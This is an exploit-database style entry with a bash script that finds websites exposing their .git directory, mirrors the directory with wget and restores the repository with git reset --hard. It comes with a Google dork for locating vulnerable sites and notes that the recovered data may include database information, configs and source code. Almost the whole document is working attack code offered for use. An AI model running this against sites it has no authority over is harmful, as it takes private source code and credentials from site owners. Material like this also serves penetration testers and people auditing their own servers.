# Exploit Title: Restore GIT repository by publicly exposed .git directory
# Google Dork: intitle:"Index of /.git"
# Date: 2022-10-01
# Exploit Author: Adrian Grabowski
# Vendor Homepage: N/A
# Software Link: N/A
# Category: Web Application
# Tested on: Apache2
# CVE : N/A

# Explanation: Most of the web-applications are maintained using git
# repositories containing important data like
# db-info,logs,configs,main-source code,etc. Many of them are forget to hide
# or remove the .git directory from live websites.Its can able to expose of
# important data.

#/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

header() {
  echo "GitDownloader - download and restore repository by exposed .git directory"
  echo ""
}

process_website() {
  url=$1

  printf "${YELLOW}[!] ${NC} Checking ${url}... \n"

  # TODO: Zmienić na wget
  result=$(curl $url/.git -L -s --connect-timeout 3  | grep "Index of")

  if [[ ! -z "$result" ]] ; then
      printf "${GREEN}[+] ${NC} SUCCESS: git exposed\n"
      printf "[ ]  Downloading...\n"

      wget nH --quiet --mirror --no-parent --connect-timeout=3 --tries=1 --page-requisites --directory-prefix=./ --convert-links $url/.git/

      if [ -f "./${url}/.git/HEAD" ]; then
          printf "${GREEN}[+] ${NC} Git directory synchronized \n"

          printf "[ ]  Resetting HEAD of project \n"
          cd $url
          git reset --hard
          cd ../

      else
          printf "${RED}[x] ${NC} Git directory IS NOT synchronized \n"
      fi
  else
      printf "${RED}[x] ${NC} Git directory IS NOT exposed \n"
  fi
}

check_requirements() {
  if ! command -v git &> /dev/null
  then
      header
      echo "${RED}GIT could not be found - please install${NC}"
      exit
  fi

  if ! command -v wget &> /dev/null
  then
      header
      echo "${RED}WGET could not be found - please install${NC}"
      exit
  fi
}

show_help() {
  header
  echo "Usage: '`basename $0` URL' or '`basename $0` --help'"
}

if [[ ! -z "$1" ]] ; then
  check_requirements

  process_website $1
else
  show_help
fi
